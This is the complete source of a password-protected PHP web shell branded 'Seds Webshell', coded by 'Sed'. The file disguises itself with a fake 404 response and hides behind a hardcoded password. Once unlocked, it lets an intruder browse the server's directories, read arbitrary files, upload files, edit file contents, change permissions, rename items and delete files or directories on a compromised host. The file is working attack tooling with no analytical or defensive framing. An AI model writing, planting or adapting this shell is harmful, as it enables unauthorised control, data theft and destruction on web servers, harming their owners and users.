<?php
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "Sed@php";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?403Forbidden'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?403Forbidden'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>Sed</title>
<link rel="icon" href="https://cdn.discordapp.com/attachments/1234082314514989056/1297247494698303589/sus.jpg?ex=67153b60&is=6713e9e0&hm=3b9a1fa194fe5f26f6ecf4c1e0634a14b84133968ce98ee3f6424c29b2bce5ce&"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<style>
  html{
    overflow: auto;
    background: black;
    color: #A6B3CC;
    font-family: "Kelly Slab",cursive;
  }
  input {
    background: transparent;
    color: #fff;
    height: 25px;
    border: 1px solid #fff;
    border-radius: 10px;
    padding: 3px;
    font-size: 15px;
  }
  .img {
    width: 150px;
    border: 1px solid #fff;
    border-radius: 10px;
  } 
input,select,textarea{
border: 1px #A6B3CC solid;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;    
  } .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: #F504F7; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
<table width="100%" height="100%">
<form enctype="multipart/form-data" method="post">
  <td align="center">
    <pre class="blink_text">
░██████╗███████╗██████╗░
██╔════╝██╔════╝██╔══██╗
╚█████╗░█████╗░░██║░░██║
░╚═══██╗██╔══╝░░██║░░██║
██████╔╝███████╗██████╔╝
╚═════╝░╚══════╝╚═════╝░
    </pre>
    <input type="password" name="password" placeholder="Enter the password">
    <input type="submit" value="Submit">
    <center><p class="blink_text" style="font-size:40px;color:#F504F7;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">Seds Webshell</font></center>
          <br>      
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="icon" type="image/gif" href="successfully deleted file"><br>
<link href="" rel="stylesheet" type="text/css">
<title>WebShell</title><link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<center><p class="blink_text" style="font-size:50px;color:#7e52c6;text-shadow: 0px 0px 20px #F504F7 , 0px 0px 20px #F504F7;font-family:Kelly Slab;">&lt;/&gt; Sed &lt;/&gt; </font></center>
<style>
body{
font-family: "Kelly Slab"; cursive ;background-color:#000;
color:#A6B3CC;
}
#content tr:hover{
background-color: #2b282b;
text-shadow:0px 0px 10px #ffffff;
}

#content .first{
background-color: #191919;
}
table{
border: 1px #191919 dotted ;
}
.destroy_table {;
  background:#191919;
  border:1px solid #000;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:#F504F7;
  font-size:17x;
  padding:3px 20px;
  text-decoration:#fff;
  text-shadow:0px 0px 0px #7e52c6;
      }
a{
color:#fff;
text-decoration: none;
}
a:hover{
color:#fff;
text-decoration: underline;
// text-shadow:0px 0px 10px ;
}
input,select,textarea{
border: 1px #A6B3CC solid;font-family:kelly slab;background-color:#191919;color:#F504F7;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;
} .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: #7e52c6; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
</head>
<body>
<table width="700" border="5" cellpadding="5" cellspacing="5" align="center">

<tr><td><font color="#F504F7">Your Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#F504F7"> Successful </font><br />';
}else{
echo '<font color="red"> Upload Failed </font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="#F504F7">Select Your File :</font> <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
echo "<center>";
echo "<center><table id='menu' width='700' border='0' cellpadding='5' cellspacing='5' align='center'><tr><td>";
echo "<center><a class='destroy_table' href='?'>Home</a>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "</center>";
?>
<?php 
if($_GET['logout'] == true) {
  unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
  echo "<script>window.location='?';</script>";
}

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#F504F7">Permission successfully changed </font><br/>';
}else{
echo '<font color="red">Permission failed </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#F504F7">Name change successful</font><br/>';
}else{
echo '<font color="red">Name change failed </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#F504F7">Successfully Edited File </font><br/>';
}else{
echo '<font color="red">Failed Editing File </font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#F504F7">Successfully deleted directory</font><br/>';
}else{
echo '<font color="red">Failed deleting directory</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#F504F7">successfully deleted file</font><br/>';
}else{
echo '<font color="red">Failed deleting file</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#F504F7">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Sed</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#F504F7">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="#fff">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Sed</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<font color="#fff" size="2px"><center><br/><b>Coded by <font color="#7e52c6"> Sed</a></font></center></font>

</body>
</html>
';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
